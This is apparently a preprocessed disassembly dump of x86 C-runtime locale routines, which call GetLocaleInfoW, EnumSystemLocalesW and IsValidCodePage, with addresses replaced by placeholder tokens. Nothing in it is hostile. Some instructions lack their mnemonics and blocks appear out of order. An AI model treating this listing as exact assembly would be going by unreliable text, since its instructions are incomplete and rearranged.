jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x84 ]
test eax eax
je r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_42d3b1
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_42d3b1
push [ ebx ]
call sub_42d3b1
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_42d3b1
pop ecx
push [ esi + 0x7c ]
call sub_42d3b1
push [ esi + 0x88 ]
call sub_42d3b1
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_42d3b1
push [ esi + 0x88 ]
call sub_43965e
pop ecx
pop ecx
push eax
call sub_42d3b1
push [ esi + 0x88 ]
call sub_439b52
pop ecx
pop ecx
sub_43a787
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x7fffffff
pop ebp
retn
cmp ecx r--data
je r-xdata
xor eax eax
inc eax
[ ecx + 0xb0 ] eax
inc eax
pop ebp
retn
sub_43a7b0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
cmp esi r--data
je r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
jne r-xdata
push esi
call sub_43a1fc
push esi
call sub_42d3b1
pop ecx
pop ecx
sub_43a7e0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x7fffffff
pop ebp
retn
cmp ecx r--data
je r-xdata
or eax 0xffffffff
[ ecx + 0xb0 ] eax
dec eax
pop ebp
retn
sub_43a809
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
[ eax + 0xc ]
mov ecx [ eax + 0x7c ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x84 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x80 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
[ ecx ]
push esi
push 0x6
lea ecx [ eax + 0x28 ]
pop esi
[ ecx ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov edx [ ecx ]
test edx edx
je r-xdata
add ecx 0x10
sub esi 0x1
jne r-xdata
mov edx [ ecx - 0x4 ]
test edx edx
je r-xdata
[ edx ]
cmp [ ecx - 0x8 ] rw-data
je r-xdata
push [ eax + 0x9c ]
call sub_43a7e0
pop ecx
pop esi
[ edx ]
sub_43a88a
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
call sub_430a7e
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x350 ] ecx
je r-xdata
push 0x4
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ edi + 0x4c ]
push eax
call sub_43a901
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43a8f0
test esi esi
jne r-xdata
mov esi [ edi + 0x4c ]
test esi esi
jne r-xdata
mov eax esi
call sub_40d2b6
retn
call sub_42d45a
sub_43a901
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edi [ eax ]
cmp edi esi
jne r-xdata
push esi
mov [ eax ] esi
call sub_43a5c0
pop ecx
test edi edi
je r-xdata
mov eax esi
jmp r-xdata
push edi
call sub_43a809
cmp [ edi + 0xc ] 0x0
pop ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
cmp edi rw-data
je r-xdata
push edi
call sub_43a63d
pop ecx
jmp r-xdata
sub_43a951
mov edi edi
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0xb0 ]
push 0x55
push eax
or [ esi + 0x8 ] 0x104
call sub_42fcca
cmp eax 0x1
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0xb0 ]
push edi
lea edx [ ecx + 0x2 ]
xor edi edi
mov ax [ ecx ]
add ecx 0x2
cmp ax di
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea eax [ esi + 0x250 ]
push 0x55
push eax
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_430e5d
int3
pop edi
sub_43a9da
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
push 0x2
pop edx
mov ecx [ esi ]
mov [ ebp - 0x4 ] ebx
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor ebx ebx
sar ecx 0x1
cmp ecx 0x3
mov ecx [ esi + 0x4 ]
sete bl
mov [ esi + 0x10 ] ebx
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax [ ebp - 0x4 ]
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x14 ] eax
test ebx ebx
jne r-xdata
xor ebx ebx
mov [ esi + 0xc ] edx
push ebx
push ebx
push 0x3
push sub_43ab03
call sub_42f89e
mov ecx [ esi + 0x8 ]
test cl 0x7
setne dl
bt ecx 0x9
setb al
and dl al
bt ecx 0x8
setb al
test al dl
jne r-xdata
push [ esi ]
call sub_43aacf
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi + 0x8 ] ebx
sub_43aa74
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
push 0x2
pop edx
mov ecx [ esi ]
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x10 ] eax
test eax eax
jne r-xdata
push ebx
push ebx
push 0x3
push sub_43aded
mov [ esi + 0xc ] edx
call sub_42f89e
test [ esi + 0x8 ] 0x4
jne r-xdata
push [ esi ]
call sub_43aacf
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi + 0x8 ] ebx
sub_43aacf
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
test ecx ecx
jne r-xdata
movzx eax [ ecx ]
add ecx 0x2
cmp ax 0x41
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0xffffff9f
cmp ax 0x19
ja r-xdata
cmp ax 0x5a
jbe r-xdata
mov eax edx
pop ebp
retn
inc edx
jmp r-xdata
sub_43ab03
mov edi edi
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_430a7e
mov esi eax
lea eax [ ebp - 0x84 ]
push 0x40
push eax
mov ecx [ esi + 0x64 ]
neg ecx
sbb ecx ecx
and ecx 0xfffff005
add ecx 0x1002
push ecx
push edi
call sub_42fb9a
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x54 ]
call sub_444b19
xor ebx ebx
mov [ ebp - 0x88 ] ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x58 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x58 ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
push 0x40
lea eax [ ebp - 0x84 ]
push eax
mov eax [ esi + 0x60 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call sub_42fb9a
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi + 0x58 ]
shr eax 0x2
not eax
and eax 0x1
mov ecx [ esi + 0x60 ]
lea eax [ ebp - 0x84 ]
neg ecx
push 0x40
sbb ecx ecx
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push edi
call sub_42fb9a
test eax eax
jne r-xdata
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x50 ]
call sub_444b19
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x58 ] ebx
jmp r-xdata
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x50 ]
call sub_444b19
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi + 0x58 ] ebx
test [ esi + 0x58 ] 0x2
jne r-xdata
or [ esi + 0x58 ] 0x304
mov ecx edi
lea edx [ ecx + 0x2 ]
xor eax eax
inc eax
jmp r-xdata
or [ esi + 0x58 ] 0x200
mov edx [ esi + 0x58 ]
cmp [ esi + 0x60 ] ebx
je r-xdata
pop ebx
cmp [ esi + 0x5c ] ebx
je r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push edi
lea eax [ esi + 0x2a0 ]
push 0x55
push eax
call sub_436551
add esp 0x10
test eax eax
je r-xdata
cmp [ esi + 0x5c ] ebx
je r-xdata
or edx 0x100
mov [ esi + 0x58 ] edx
lea edx [ esi + 0x2a0 ]
cmp [ edx ] bx
jne r-xdata
test [ esi + 0x58 ] 0x1
jne r-xdata
push [ esi + 0x5c ]
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x50 ]
call sub_43d7c6
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
or edx 0x100
mov [ esi + 0x58 ] edx
lea edx [ esi + 0x2a0 ]
cmp [ edx ] bx
jne r-xdata
mov ecx [ esi + 0x50 ]
lea ebx [ ecx + 0x2 ]
mov ecx edi
lea ebx [ ecx + 0x2 ]
push edi
call sub_43af95
pop ecx
test eax eax
je r-xdata
or [ esi + 0x58 ] 0x2
mov ecx edi
lea edx [ ecx + 0x2 ]
push ebx
push ebx
push ebx
push ebx
push ebx
mov ecx edi
lea ebx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
sub ecx ebx
sar ecx 0x1
cmp ecx [ esi + 0x5c ]
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
sub ecx ebx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push edi
push 0x55
push edx
call sub_436551
add esp 0x10
test eax eax
je r-xdata
or [ esi + 0x58 ] 0x1
mov ecx edi
lea edx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
jmp r-xdata
xor ebx ebx
push edi
call sub_43af95
pop ecx
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
jmp r-xdata
or [ esi + 0x58 ] 0x100
lea edx [ esi + 0x2a0 ]
xor eax eax
cmp [ edx ] ax
jne r-xdata
mov ebx [ esi + 0x50 ]
xor edx edx
lea ecx [ ebx + 0x2 ]
call sub_430e5d
int3
mov ecx edi
lea ebx [ ecx + 0x2 ]
mov ax [ ebx ]
add ebx 0x2
cmp ax dx
jne r-xdata
push [ esi + 0x50 ]
sub ebx ecx
sar ebx 0x1
call sub_43aacf
pop ecx
cmp eax ebx
je r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
jmp r-xdata
sub_43aded
mov edi edi
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_430a7e
mov esi eax
lea eax [ ebp - 0xf4 ]
push 0x78
push eax
mov ecx [ esi + 0x60 ]
neg ecx
sbb ecx ecx
and ecx 0xfffff002
add ecx 0x1001
push ecx
push edi
call sub_42fb9a
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ esi + 0x50 ]
call sub_444b19
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x58 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x58 ]
shr eax 0x2
not eax
and eax 0x1
mov ecx edi
push ebx
xor ebx ebx
lea edx [ ecx + 0x2 ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0xc
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push edi
lea eax [ esi + 0x2a0 ]
push 0x55
push eax
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_430e5d
int3
or [ esi + 0x58 ] 0x4
pop ebx
sub_43aeae
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x20001004
add eax 0x250
push eax
call sub_42fb9a
test eax eax
jne r-xdata
xor eax eax
cmp [ ecx ] ax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov esi r--data
mov edx ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
call [ GetACP@IAT ]
sbb edx edx
or edx 0x1
test di di
je r-xdata
mov esi r--data
mov edx ecx
mov edx eax
jmp r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
sbb eax eax
or eax 0x1
test di di
je r-xdata
test edx edx
je r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
push ecx
call sub_42ef12
pop ecx
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x2000000b
add eax 0x250
push eax
call sub_42fb9a
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
jmp r-xdata
sub_43af95
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push 0x9
push eax
push 0x59
push esi
call sub_42fb9a
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
push 0x9
lea eax [ ebp - 0x18 ]
push esi
push eax
call sub_43a3af
add esp 0xc
neg eax
sbb eax eax
inc eax
sub_43afe0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_43af95
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
mov eax [ ebp + 0x10 ]
push esi
mov ecx [ eax ]
mov esi ecx
lea edx [ esi + 0x2 ]
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
sub esi edx
push ecx
sar esi 0x1
call sub_43aacf
pop ecx
cmp eax esi
pop esi
jne r-xdata
xor eax eax
pop ebp
retn
sub_43b026
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
xor edx edx
push edi
inc edx
xor edi edi
test esi esi
js r-xdata
xor eax eax
test edx edx
pop edi
sete al
pop esi
mov esp ebp
pop ebp
retn
push ebx
pop ebx
lea eax [ edi + esi ]
cdq
sub eax edx
mov ebx eax
mov eax [ ebp + 0x8 ]
sar ebx 0x1
imul ecx ebx 0xc
mov [ ebp - 0x4 ] ecx
push [ ecx + eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_444b19
mov edx eax
pop ecx
pop ecx
test edx edx
jne r-xdata
jns r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax 0x4
add ecx eax
mov eax [ ebp + 0x10 ]
mov [ eax ] ecx
jmp r-xdata
lea edi [ ebx + 0x1 ]
lea esi [ ebx - 0x1 ]
jmp r-xdata
cmp edi esi
jle r-xdata
test edx edx
je r-xdata
sub_43b095
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
call sub_430a7e
mov ebx [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x8 ] ecx
lea esi [ eax + 0x50 ]
lea eax [ esi + 0x250 ]
mov [ esi + 0x8 ] ecx
mov [ eax ] cx
lea edi [ esi + 0x4 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x80 ]
mov [ esi ] ebx
mov [ edi ] eax
cmp [ eax ] cx
je r-xdata
mov eax [ esi ]
push esi
cmp [ eax ] cx
je r-xdata
push edi
push 0x16
push r--data
call sub_43b026
add esp 0xc
xor ecx ecx
call sub_43a951
mov eax [ edi ]
cmp [ eax ] cx
je r-xdata
xor eax eax
lea eax [ ebx + 0x100 ]
push esi
push eax
call sub_43aeae
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_43aa74
call sub_43a9da
jmp r-xdata
cmp esi 0xfde8
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
je r-xdata
push esi
push 0x40
push r--data
call sub_43b026
add esp 0xc
test eax eax
je r-xdata
xor eax eax
pop ecx
cmp [ esi + 0x8 ] eax
jne r-xdata
cmp esi 0xfde9
je r-xdata
mov eax [ edi ]
xor ecx ecx
push esi
cmp [ eax ] cx
je r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
call sub_43aa74
jmp r-xdata
call sub_43a9da
jmp r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
pop ecx
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
mov [ eax ] esi
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
lea ebx [ edi + 0x120 ]
xor eax eax
mov [ ebx ] ax
lea edx [ ecx + 0x2 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x8 ]
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push [ ebp - 0x4 ]
push 0x55
push ebx
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
push 0x40
push edi
push 0x1001
push ebx
call sub_42fb9a
test eax eax
je r-xdata
push 0x40
lea ebx [ edi + 0x80 ]
push ebx
push 0x1002
lea eax [ edi + 0x120 ]
push eax
call sub_42fb9a
test eax eax
je r-xdata
push 0x5f
push ebx
call sub_44c17b
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x40
push ebx
push 0x7
lea eax [ edi + 0x120 ]
push eax
call sub_42fb9a
test eax eax
je r-xdata
push 0x2e
push ebx
call sub_44c17b
pop ecx
pop ecx
test eax eax
je r-xdata
push 0xa
push 0x10
lea eax [ edi + 0x100 ]
push eax
push esi
call sub_444910
add esp 0x10
sub_43b264
mov edi edi
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_430a7e
mov ebx eax
call sub_430a7e
push esi
mov edi [ eax + 0x34c ]
call sub_43b7c6
pop ecx
mov ecx [ ebx + 0x64 ]
mov esi eax
neg ecx
lea eax [ ebp - 0xf4 ]
push 0x78
sbb ecx ecx
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x54 ]
call sub_444b19
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
inc eax
jmp r-xdata
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
push esi
call sub_43b8fa
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
or [ edi ] 0x4
mov [ edi + 0x8 ] esi
mov [ edi + 0x4 ] esi
sub_43b30d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
call sub_430a7e
mov edx eax
xor edi edi
mov ecx [ edx + 0x54 ]
lea esi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax di
jne r-xdata
sub ecx esi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
push 0x1
sete al
push sub_43b264
mov [ edx + 0x64 ] eax
call [ EnumSystemLocalesW@IAT ]
mov eax [ ebp + 0x8 ]
test [ eax ] 0x4
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ eax ] edi
sub_43b376
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_430a7e
mov esi eax
xor ebx ebx
push 0x2
pop edx
mov ecx [ esi + 0x50 ]
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
mov ecx [ esi + 0x54 ]
sete al
mov [ esi + 0x60 ] eax
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
mov edi [ ebp + 0x8 ]
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x64 ] eax
mov [ edi + 0x4 ] ebx
cmp [ esi + 0x60 ] ebx
jne r-xdata
push 0x1
push sub_43b49e
mov [ esi + 0x5c ] edx
call [ EnumSystemLocalesW@IAT ]
mov ecx [ edi ]
test cl 0x7
setne dl
bt ecx 0x9
setb al
and dl al
bt ecx 0x8
setb al
test al dl
jne r-xdata
push [ esi + 0x50 ]
call sub_43b472
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ edi ] ebx
sub_43b411
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_430a7e
mov esi eax
xor ebx ebx
push 0x2
pop edx
mov ecx [ esi + 0x50 ]
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x60 ] eax
test eax eax
jne r-xdata
push 0x1
push sub_43b6ee
mov [ esi + 0x5c ] edx
call [ EnumSystemLocalesW@IAT ]
mov eax [ ebp + 0x8 ]
test [ eax ] 0x4
jne r-xdata
push [ esi + 0x50 ]
call sub_43b472
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ eax ] ebx
sub_43b472
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
add eax 0xffffff9f
cmp ax 0x19
ja r-xdata
cmp ax 0x5a
jbe r-xdata
mov eax edx
pop ebp
retn
inc edx
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
cmp ax 0x41
jb r-xdata
sub_43b49e
mov edi edi
push ebp
mov ebp esp
sub esp 0xfc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_430a7e
mov ebx eax
call sub_430a7e
push esi
mov edi [ eax + 0x34c ]
call sub_43b7c6
pop ecx
mov ecx [ ebx + 0x64 ]
mov esi eax
neg ecx
lea eax [ ebp - 0xf4 ]
push 0x78
sbb ecx ecx
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x54 ]
call sub_444b19
and [ ebp - 0xf8 ] 0x0
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] 0x0
mov eax [ edi ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
push 0x78
lea eax [ ebp - 0xf4 ]
push eax
mov eax [ ebx + 0x60 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
mov ecx [ ebx + 0x60 ]
lea eax [ ebp - 0xf4 ]
neg ecx
push 0x78
sbb ecx ecx
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_444b19
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_444b19
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ edi ] eax
jmp r-xdata
test [ edi ] 0x2
jne r-xdata
or [ edi ] 0x304
mov [ edi + 0x4 ] esi
jmp r-xdata
xor eax eax
cmp [ ebx + 0x60 ] eax
jne r-xdata
or [ edi ] 0x200
mov edx [ edi ]
cmp [ ebx + 0x60 ] eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov [ edi + 0x8 ] esi
cmp [ ebx + 0x5c ] eax
je r-xdata
cmp [ ebx + 0x5c ] eax
je r-xdata
or edx 0x100
mov [ edi ] edx
mov edx [ edi ]
test dl 0x1
jne r-xdata
push [ ebx + 0x5c ]
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_43d7c6
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_444b19
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebx + 0x50 ]
lea eax [ ecx + 0x2 ]
mov [ ebp - 0xfc ] eax
jne r-xdata
push esi
call sub_43b8fa
pop ecx
test eax eax
je r-xdata
or [ edi ] 0x2
mov [ edi + 0x8 ] esi
mov ecx [ ebx + 0x50 ]
lea edx [ ecx + 0x2 ]
push edi
xor ebx ebx
push ebx
push esi
call sub_43b91e
add esp 0xc
test eax eax
je r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0xf8 ]
jne r-xdata
sub ecx [ ebp - 0xfc ]
sar ecx 0x1
cmp ecx [ ebx + 0x5c ]
jne r-xdata
mov [ edi + 0x4 ] esi
or edx 0x1
mov [ edi ] edx
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0xf8 ]
jne r-xdata
sub ecx edx
sar ecx 0x1
cmp ecx [ ebx + 0x5c ]
jne r-xdata
or [ edi ] 0x100
cmp [ edi + 0x4 ] ebx
xor eax eax
jmp r-xdata
push edi
push 0x1
push esi
call sub_43b91e
add esp 0xc
test eax eax
je r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
or [ edi ] 0x100
xor eax eax
jmp r-xdata
cmp [ edi + 0x4 ] eax
jmp r-xdata
sub_43b6ee
mov edi edi
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_430a7e
mov ebx eax
call sub_430a7e
push esi
mov edi [ eax + 0x34c ]
call sub_43b7c6
pop ecx
mov ecx [ ebx + 0x60 ]
mov esi eax
neg ecx
lea eax [ ebp - 0xf4 ]
push 0x78
sbb ecx ecx
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_444b19
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
inc eax
jmp r-xdata
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
cmp [ ebx + 0x60 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
cmp [ ebx + 0x5c ] 0x0
je r-xdata
or [ edi ] 0x4
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
push edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_444b19
pop ecx
pop ecx
test eax eax
